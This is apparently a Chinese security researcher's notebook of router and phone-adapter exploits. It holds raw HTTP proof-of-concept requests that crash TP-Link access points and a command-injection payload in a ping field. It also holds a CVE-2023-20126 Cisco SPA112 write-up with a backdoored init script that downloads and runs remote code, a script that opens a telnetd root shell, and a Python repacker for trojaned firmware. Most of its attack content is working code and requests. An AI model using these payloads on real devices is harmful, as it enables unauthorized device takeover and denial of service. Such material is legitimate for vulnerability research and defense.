{"pingSet":{"pingIp":"0.0.0.0111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","pingNum":"4","pingSize":"64"}}
```

bug7
422774

```HTTP
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 1692
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"wifiRadioSetIndoor":{"wifiEn":true,"countryCode":"CN","netMode":"anacax","channel":"0","bandwidth":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","currentPower":"29","radio":"5G"}}
```



bug8
4274B4

```HTTP
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 620
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"setPing":{"ip":"192.168.0.111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","times":4,"sig":"anacax"}}
```

bug9
4276E4

```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 593
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"spdtstConfigAndStart":{"mode":0,"time_sec":0,"ip":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",
"txrate":0,
"sig":"aaaa"}}
```



bug10命令注入

```http
POST /goform/modules?0.13346464962467874 HTTP/1.1
Host: 192.168.0.254
Content-Length: 77
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"pingSet":{"pingIp":"www.$(touch /flag).com","pingNum":"4","pingSize":"64"}}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231210111613.png)


## TL-XAP3007GC-PoE/DC

### 版本信息
V1.0 20220530_1.0.12
https://resource.tp-link.com.cn/pc/docCenter/showDoc?productId=1875&type=UPGRADE_SOFT&id=1657242724588266

v2.0 20230831_1.0.5
https://resource.tp-link.com.cn/pc/docCenter/showDoc?productId=1875&type=UPGRADE_SOFT&id=1699233938075326

### 漏洞分析
binwalk解压固件，armhf小端序，用musl进行编译的，观察文件系统发现是OpenWrt魔改

```shell
./sbin/psh: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-arm.so.1, stripped
```

主要的服务二进制文件为./bin/dms，查阅资料说是设备管理服务

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231225133045.png)

其中有几个值得注意的函数

commandAdd，用于注册cmd命令

```c
.data:003D6568 00                            unk_3D6568 DCB    0                     ; DATA XREF: sub_1C5780+20↑o
.data:003D6568                                                                       ; sub_1C5780+30↑o
.data:003D6568                                                                       ; .text:off_1C5C2C↑o
.data:003D6568                                                                       ; lanInit+908↑o
.data:003D6568                                                                       ; lanInit+90C↑o
.data:003D6568                                                                       ; .text:off_1C97B8↑o
.data:003D6569 00                            DCB    0
.data:003D656A 00                            DCB    0
.data:003D656B 00                            DCB    0
.data:003D656C 00                            DCB    0
.data:003D656D 00                            DCB    0
.data:003D656E 00                            DCB    0
.data:003D656F 00                            DCB    0
.data:003D6570 F7 F7 33 00                   DCD aNetworkInterfa_0+0x13              ; "lanv6"
.data:003D6574 9B F6 35 00                   DCD aLanv6DebugComm                     ; "lanv6 debug command."
.data:003D6578 80 57 1C 00                   DCD sub_1C5780
.data:003D657C B0 F6 35 00                   DCD aDss                                ; "dss"
.data:003D6580 90 65 3D 00                   off_3D6580 DCD off_3D6590               ; DATA XREF: sub_1C5780+7C↑r
.data:003D6580                                                                       ; sub_1C5780+120↑r
.data:003D6580                                                                       ; sub_1C5780+3B8↑r
.data:003D6580                                                                       ; "debug"
.data:003D6584 04 00 00 00                   dword_3D6584 DCD 4                      ; DATA XREF: sub_1C5780+74↑r
.data:003D6584                                                                       ; sub_1C5780+11C↑r
.data:003D6584                                                                       ; sub_1C5780+3B4↑r
.data:003D6588 00                            DCB    0
.data:003D6589 00                            DCB    0
.data:003D658A 00                            DCB    0
.data:003D658B 00                            DCB    0



```


```
commandAdd用于注册 cmdTask 命令行指令的函数
hwSwMode  enter switch hardware mode
nmsMsg nmsMsg request
dhcpEvent Add dhcp event node.
dhcpv6Event Add dhcpv6 event node.
appManage  app manage request.
list List all supported command on DMS.
netdev DMS netdev management.
taskManage DMS tasks information.
gpio_ctrl GPIO read and write.
switch_ioctl switch ioctl test.
flash  Display flash layout info, read Flash c
mcb Show mcb pools or blocks.
msgbus msg bus
cfg80211 use NL80211 interface to send msg.
aps Cfg path selection.
wtp wtp information or debug command.
cloudClient cloudClient request.
devinfo Display hardware id, device id and othe
dhcps Handle DHCP Server request.
dhcpv6s show all dhcpv6 host.
sta_manage  Manage all stations.
http http request.
link Display link info
lldp cloudClient request.
encrypt encrypt debug commands
bh_optimize backhaul optimize commands
lan lan business commands
tp_business tp_business debug commands
pair pair debug commands
netif netif manage commands
mgt subrouter manage commands
role_switch topology role switch commands
wss wss commands
backhaul backhaul event commands
device device manage commands
station station event commands
topology  topology manage commands
event_notifier mapd event notifier
lanv6  lanv6 debug command.
smartDhcp smartDhcp debug command.
rtadvc send RS pkt.
rtadvd send pkt.
statistics statistics request.
sysmode sysmode debug command.
dhcpc Handle DHCPC request.
dhcpcv6 Handle DHCPC request.
wan_port_detect 
wlancfg Cfg wlan or display status.
wportal Config or display wportal info.
data_module Ctrl command for DMS data module mvc.
pipe write to or dump pipe list.
log_conf Configure DMS log system, set level and
```


modelRead函数
```
modelRead("/network/interface/lanv6", dest, 0x4Cu)
```

首先会检查a1是否为非空，并且是否以'/'开头，这表明路径或键名的格式要求。通过字符串操作函数（如strchr和memcpy）解析a1中的路径或键名，分解为不同的部分。getModulerRoot会用于获取模块所在根目录，其中加载模块用到了json_object_load_from_file函数，来自./usr/lib/libjson.so.0.0.1，用于打开一个文件，读取其内容，并尝试将内容解析为JSON格式。再用jsonObjectObjectGet，用于在解析后的JSON数据结构中进行高效的键值对查找操作。最后根据json的字段执行相应的函数
```
                  v18 = v21(a1, v20, a2 + v18, a3 - v18);
```

这个函数似乎是执行函数功能的主要逻辑，用于提取json到a2参数中，conf/template似乎就是它的模块根目录，其中似乎限制了每个字段的大小


registerAction函数
```
registerAction("plugin_config", "get_plugins", getPluginsReqHandle);
```

校验对应的数据模块中，"get_plugins"字段是否存在，不存在则分配一个内存，设置动作对应函数"get_plugins"  -》 getPluginsReqHandle
主要的作用是在一个数据模块中注册一个新的动作或事件

registerAppModule函数
```
registerAppModule(&uhttpdService);
```

主要目的是在系统中注册或更新一个应用模块。它首先验证输入参数的有效性，然后查找系统中是否已存在匹配的模块。主要用于更新操作接口。


处理的数据是 json 格式，基本参数包括 method、request
函数根据不同的 method 会做不同的处理，具体包含 get、add、delete、set、do
处理逻辑类似于 switch case 结构，根据不同的 request 调用不同的 handler

```
{
	"system":{
		"firmware_upgrade":{
			"type":"0"
		}
	},
	"method":"do"
}
```

其中一些不需要鉴权的接口
httpReqOpenSysInfo # device_info capability account_info_status
httpReqRoleInfo
httpProcDataSrv
httpProcDsMethod   internMethodOpr
getPluginStatusReqHandle 


由于在FAP模式下默认在1900端口开启了服务，可以分析miniUPnPSSDPHandle函数

### 利用分析

POC

```http
POST /stok=vzXv4LEE50E5Ov0yvrBmVddEtVfPfmDb/ds HTTP/1.1
Host: 192.168.1.254
Content-Length: 1025
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.254
Referer: http://192.168.1.254/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"method":"set","cloud_config":{"conf_mngt":{"mngt_switch":"1"},"cloud_type":{"cloud_type":"user_define"},"tums_info":{"server":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.telnetdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com","port":"60443"}}}
```

会导致AP服务崩溃，重置无法恢复

POC2

在开启telnet的情况下再次发包会导致所有连接设备退出
```HTTP
POST /stok=vzXv4LEE50E5Ov0yvrBmVddEtVfPfmDb/ds HTTP/1.1
Host: 192.168.1.254
Content-Length: 1025
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.254
Referer: http://192.168.1.254/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"method":"set","telnet":{"rule":{"enable":"1"}}}
```




参考文章：https://mp.weixin.qq.com/s/98YDkBrg0XZe32NLNnn5JQ?ref=www.ctfiot.com




# 漏洞复现

## 1.CVE-2023-20126 Cisco SPA112

### 漏洞描述

Cisco SPA112 2 端口电话适配器基于 Web 的管理界面中存在漏洞，可能允许未经身份验证的远程攻击者在受影响的设备上执行任意代码。该漏洞是由于固件升级功能中缺少身份验证过程造成的。攻击者可以通过将受影响的设备升级到精心设计的固件版本来利用此漏洞。成功利用该漏洞可能允许攻击者以完全权限在受影响的设备上执行任意代码。思科尚未发布固件更新来解决此漏洞。

### 影响范围及版本

Cisco SPA112 1.4.1 SR5 (已停止维护)
### 漏洞分析

固件下载：https://software.cisco.com/download/home/283998771/type/282463187/release/1.4.1%20SR5


由于环境搭建不起来，似乎是因为缺少nvram
```shell
# /usr/sbin/httpd 
[nv_get_config_data] fopen() failed!: /nvram/nvram.data
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 1
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 2
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 3
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 4
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 5
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 6
httpd:No LAN IP address and protocol specified.
: File exists
```

由于漏洞点比较简单先分析httpd，主要是cgi和asp的方式，main函数比较长，用了几个nvram函数函数去获取参数和匹配字段，这些函数都在usr/lib/libnvram.so中


```c
            "Usage: %s [-S] [-p port]\n"
            "\t-S : Support https (port 443)\n"
            "\t-p port : Which port to listen?\n"
            "\t-t secs : How many seconds to wait before timing out?\n"
            "\t-s ciphers: set cipher lists\n"
            "\t-g: get cipher lists\n",
```

```
nvram_match   匹配成功返回1,否则返回第一个参数里的值
nvram_get_ex   
nvram_invmatch
```

```c
bool __fastcall nvram_match(int a1, const char *a2)
{
  const char *v3; // r0
  const char *v4; // r3
  int v6; // [sp+0h] [bp-48h] BYREF

  v3 = j_nvram_get_ex(a1, &v6);
  v4 = v3;
  if ( v3 )
    return strcmp(v3, a2) == 0;
  return v4;
}


int __fastcall nvram_invmatch(char *a1, const char *a2)
{
  const char *v3; // r0
  int v4; // r2
  int v6; // [sp+0h] [bp-48h] BYREF

  v3 = j_nvram_get_ex(a1, &v6, 0x40u);
  if ( !a2 )
    a2 = "";
  v4 = -1;
  if ( v3 )
    return strcmp(v3, a2);
  return v4;
```

从900行开始，便进入了处理报文的部分。会发现在比对url时引用aQuickSetup_ptr和aGetconnstAsp_ptr的字段

```c
        if ( !v49 )
        {
LABEL_294:
          if ( strcasecmp(s, "get") && strcasecmp(s, "post") )
          {
            sub_119FC(501, "Not Implemented", 0, "The server does not support the action requested by the browser.");
            goto LABEL_114;
          }
          if ( *v182 == 47 )
          {
            v40 = (v182 + 1);
            v103 = *(v182 + 1);
            v104 = strlen(v182 + 1);
            if ( v103 != 47 && (v103 != 46 || v182[2] != 46 || v182[3]) )
            {
              if ( strncmp(v40, "../", 3u) )
              {
                if ( !strstr(v40, "/../") )
                {
                  v105 = &v40[v104];
                  if ( (v40[v104 - 3] != asc_46F7C[0]
                     || v40[v104 - 2] != asc_46F7C[1]
                     || v40[v104 - 1] != asc_46F7C[2]
                     || v40[v104] != asc_46F7C[3])
                    && (*(v105 - 1) != 47 || *v105 || v104 <= 0) )
                  {
                    if ( !v103 || *(v105 - 1) == 47 )
                    {
                      if ( !nvram_invmatch("close_authip", &nptr)
                        || (memset(v174, 0, sizeof(v174)),
                            nvram_get_ex("http_client_ip", v174, 32),
                            nvram_get_ex("auth_ip", v175, 16))
                        && nvram_invmatch("auth_ip", v174) )
                      {
                        v40 = "login.asp";
                      }
                      else
                      {
                        v40 = "index.asp";
                      }
                    }
                    if ( nvram_get_ex("close_session", v175, 16)
                      && nvram_invmatch("close_session", &nptr)
                      && (strstr(v40, ".asp") || strstr(v40, ".cgi") || strchr(v40, 59)) )
                    {
                      sscanf(v40, "%[^;];%s", v172, &v172[50]);
                      v40 = v172;
                    }
                    if ( nvram_match("http_power", &nptr) && aQuickSetup_ptr )
                    {
                      v106 = &off_5D744;
                      while ( 1 )
                      {
                        if ( !strcmp(v40, v106[5]) )
                        {
                          v107 = v106[3];
                          if ( *v107 == 48 && !v107[1] )
                            break;
                          if ( !*v107 )
                            break;
                        }
                        v106 += 11;
                        if ( !v106[6] )
                          goto LABEL_321;
                      }
                      sub_119FC(
                        401,
                        "Bad Request",
                        0,
                        "The server could not verify that you are authorized to access the requested URL.");
                    }
                    else
                    {
LABEL_321:
                      v108 = aGetconnstAsp_ptr[0];
                      if ( !aGetconnstAsp_ptr[0] )
                        goto LABEL_113;
                      v109 = aGetconnstAsp_ptr;
                      while ( 2 )
                      {
                        for ( nn = v108; ; nn = v111 + 1 )
                        {
                          v111 = strchr(nn, 124);
                          if ( !v111 )
                            break;
                          if ( sub_10F04(nn, v111 - nn, v40) )
                            goto LABEL_98;
                        }
                        v112 = strlen(nn);
                        if ( !sub_10F04(nn, v112, v40) )
                        {
                          v113 = v109[6];
                          v109 += 6;
                          v108 = v113;
                          if ( v113 )
                            continue;
                          goto LABEL_113;
                        }
                        break;
                      }
LABEL_98:
                      v37 = v109[5];
                      if ( v37 )
                      {
                        (v37)(&off_625F4, &off_62634, &off_62674);
                        dword_623D4 = 0;
                        if ( strcmp(v40, "login.asp") )
                        {
                          if ( !sub_11120(v40) )
                          {
                            v150 = dword_64EA4;
                            if ( dword_64EA4 || sub_10340() >= 0 )
                              v40 = "login.asp";
                            else
                              sub_119FC(403, "Forbidden", v150, "Can't use wireless interface to access web.");
                          }
                        }
                      }
```

就会发现是通过数组寻址的方式寻找对应的url和对应的函数
这里用ida插件快速恢复data段的函数表<https://github.com/grayhatacademy/ida/tree/master/plugins/codatify>
恢复以后就能很快查找到upgrade函数，每个函数都是一个结构体，第四个参数就是函数，而第六个参数则是访问权限。0标志着不需要权限，而如果是sub_142b4的话，则需要鉴权。

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231205171652.png)

```c
int __fastcall sub_142B4(int a1, int a2, int a3)
{
  nvram_get_ex("http_username", a1, 64);
  nvram_get_ex("http_passwd", a2, 64);
  return nvram_get_ex("router_name", a3, 64);
}
```

而漏洞点主要是源于upgrade.cgi接口的未授权

```c
int __fastcall sub_1F7AC(int a1, int a2, int a3, int a4)
{
  int v6; // r5
  int v7; // r1
  bool v8; // zf
  int v9; // r4
  int result; // r0
  int v11; // r4
  unsigned int v12; // r1
  int v13; // r0
  int v14; // r4
  int v15; // r3
  FILE *v16; // r4
  int v17; // r5
  int v18; // [sp+Ch] [bp-42Ch] BYREF
  char v19; // [sp+17h] [bp-421h] BYREF
  char v20; // [sp+18h] [bp-420h]
  char v21; // [sp+19h] [bp-41Fh]

  v18 = a3;
  dword_64EA8 = 22;
  system("cp /www/Success_u.asp /tmp/.");
  system("cp /www/Fail_r_s.asp /tmp/.");
  system("cp /www/Success_u_s.asp /tmp/.");
  system("cp /www/Fail_u_s.asp /tmp/.");
  system("cp /sbin/write /tmp/write");
  v6 = v18;
  if ( v18 > 0 )
  {
    while ( 1 )
    {
      v7 = v6 + 1;
      if ( (v6 + 1) >= 0x400 )
        v7 = 1024;
      v8 = sub_108E0(&v19, v7, a2) == 0;
      result = &v19;
      if ( v8 )
        return result;
      v9 = v18 - strlen(&v19);
      v18 = v9;
      v6 = v9;
      if ( !strncasecmp(&v19, "Content-Disposition:", 0x14u) )
      {
        if ( strstr(&v19, "name=\"file\"") )
        {
          dword_84190 = 1;
          nvram_set("submit_button", "Upgrade");
          v17 = 2;
LABEL_14:
          if ( !nvram_match("submit_button", "Upgrade")
            || (dword_5DED4 = 0x101, dword_6DD88)
            || nvram_match("remote_upgrade", &nptr)
            || !nvram_match("router_mode", &nptr) )
          {
            v11 = v18;
            while ( 1 )
            {
              v12 = v11 + 1;
              if ( v11 <= 0 )
              {
LABEL_25:
                v13 = sub_1E048(0, a2, &v18, v17, a4);
                v14 = v18;
                dword_64EA8 = v13;
                goto LABEL_26;
              }
              if ( v12 >= 0x400 )
                v12 = 1024;
              v8 = sub_108E0(&v19, v12, a2) == 0;
              result = &v19;
              if ( v8 )
                break;
              v11 = v18 - strlen(&v19);
              v18 = v11;
              if ( v19 == 10 && !v20 || v19 == 13 && v20 == 10 && !v21 )
                goto LABEL_25;
            }
          }
          else
          {
            v16 = fopen("/dev/console", "w");
            if ( v16 )
            {
              fwrite("Can't upgrade from wan side\n", 1u, 0x1Cu, v16);
              fclose(v16);
            }
            v14 = v18;
            dword_64EA8 = 'c';
LABEL_26:
            while ( 1 )
            {
              result = a2;
              v15 = a2;
              if ( v14 <= 0 )
                break;
              while ( dword_623C8 )
              {
                BIO_gets(result, &v19, 1, v15);
                result = a2;
                v15 = a2;
                if ( v18 <= 0 )
                  return result;
              }
              result = sub_10548(&v19, 1, 1025, v15);
              if ( result < 0 )
                return result;
              v14 = v18 - result;
              v18 -= result;
            }
          }
          return result;
        }
        if ( strstr(&v19, "name=\"restore\"") )
        {
          dword_623AC = 1;
          nvram_set("submit_button", "Restore");
          v17 = 1;
          goto LABEL_14;
        }
      }
      if ( v9 <= 0 )
      {
        v17 = 0;
        goto LABEL_14;
      }
    }
  }
  return printf("\n Fail: upgrade file size = %d \n", v18);
}
```

上传的报文一般如下，结合分析，判断其中的 name 为 file 还是 restore，当 name 为 file 时，会设置submit_button 变量为 Upgrade，在后续的 if 条件判断中，会检查 submit_button 变量，如果它等于 Upgrade，则继续判断 remote_upgrade 等参数值。最终会进入sub_1E048进行升级操作

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=boundary_string

--boundary_string
Content-Disposition: form-data; name="file"; filename="file.txt"
Content-Type: text/plain

<file_content_here>

--boundary_string--

```

因此只需要构建一个恶意的固件，然后上传更新，启动时就能执行一些反弹shell的命令
### 利用分析

https://github.com/rrrrrrri/spa112-tools


难点就在于构建固件上，核心思路是将文件系统分离出来，进行修改后再打包然后拼接上原本的内容得到应该新的img
这里先用dd将文件系统分离出来
```
dd if=Payton_1.4.1_SR5_101419_1250_pfmwr.bin of=sqfs.ori bs=1 skip=1573256

if=Payton_1.4.1_SR5_101419_1250_pfmwr.bin: 这表示输入文件是Payton_1.4.1_SR5_101419_1250_pfmwr.bin。if代表input file。

of=sqfs.ori: 这表示输出文件是sqfs.ori。of代表output file。

bs=1: 这表示每次读取和写入的块大小是1字节。bs代表block size。

skip=1573256: 这表示跳过Payton_1.4.1_SR5_101419_1250_pfmwr.bin文件的前1573256个字节，然后开始读取和写入。skip用于跳过输入文件的指定字节数。
```

但是提取出来以后无法用unsquashfs进行提取
```shell
➜  spa112 unsquashfs sqfs.ori
Can't find a SQUASHFS superblock on sqfs.ori
```

文件系统被修改，这里用到了cisco的开源编译工具(不知道为什么会开源)<https://www.cisco.com/web/fw/opensource/64846727/payton_1.3.5.001_gpl-28.tar.gz>，下载后将其中用到的工具进行编译
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231205174817.png)

有了解包和打包的工具，然后就是修改文件系统，在启动文件/etc/rc.init.1中插入反弹shell的语句，由于原系统没有telnetd，这里准备一个busybox

```shell
#!/bin/sh
#
# /etc/rc.init.1 , should create necessary directory and load the driver
# please don't access nvram here, or modfiy any other env variable code here
# - by wenij
$(/bin/sleep 60 && /bin/busybox wget -O /tmp/1.sh http://192.168.0.124:8000/1.sh && /bin/busybox chmod 777 /tmp/1.sh && /tmp/1.sh) &
if [ ! -d "/var/tmp/events" ]; then
	mkdir /var/tmp/events
fi
```

1.sh
```shell
/bin/busybox wget -O /tmp/busybox http://192.168.0.136:8000/busybox
/bin/busybox chmod 777 /tmp/busybox
/tmp/busybox telnetd -l /bin/sh
```

repack.py

```python
import os
import hashlib

os.system("dd if=ori.bin of=sqfs.ori bs=1 skip=1573256")    # extract sqfs
os.system("sudo ./tools/unsquashfs ./sqfs.ori")             # unpack squashfs
os.system("sudo cp ./files/rc.init.1 ./squashfs-root/etc")  # move init script to /etc
os.system("sudo chmod 777 ./squashfs-root/etc/rc.init.1")
os.system("sudo ./tools/mksquashfs ./squashfs-root ./target/target.image -check_data -noappend -le -noI -all-root")   # repack
os.system("sudo ./tools/mkimage -A arm -O linux -C none -T filesystem -n SP2Xcybertan_rom_bin -c SP2X -d ./target/target.image -s ./target/file_system.img")    # pack to uimage

f = open("./target/file_system.img", "rb")
data = f.read()
f.close()
t = open("./target/padding_file_system.img", "wb")
t_data = data + b"\x00" * 40960    # padding \x00
t.write(t_data)
t.close()

os.system("cp ./target/kernel_mdu.bin.ori ./target/kernel_mdu.bin")
os.system("cat ./target/padding_file_system.img >> ./target/kernel_mdu.bin")
os.system("./tools/moduler -v 1.0 -t 1 -i 0 -m 0x1200000 -o ./target/kernel_pfmwr.img ./target/kernel_mdu.bin")
os.system("./tools/pkger -v \"1.4.2\" -o ./target/packed.bin ./target/kernel_pfmwr.img")

f = open("./target/packed.bin", "rb")
tmp_data = f.read()
tmp_header = tmp_data[:0x104]
next_data = tmp_data[0x104:]
f.close()

fixed_header = tmp_header[:0x30] + b"\x00" * 0x20 + b"\x00\x00\x00\x88" + b"\x00\x00\x00\x80" + b"\x00\x9a\x01\x88" + b"\x31\x2e\x34\x2e" + tmp_header[0x60:0x84] + b"\x01\xea\xea\x3a" + tmp_header[0x84:]

i = 0
token = 0
buf = []
while i < len(fixed_header):
    buf.append((fixed_header[i] + token) & 0xff)
    token += 19
    i += 1

tmp = hashlib.md5(bytes(buf)).hexdigest()
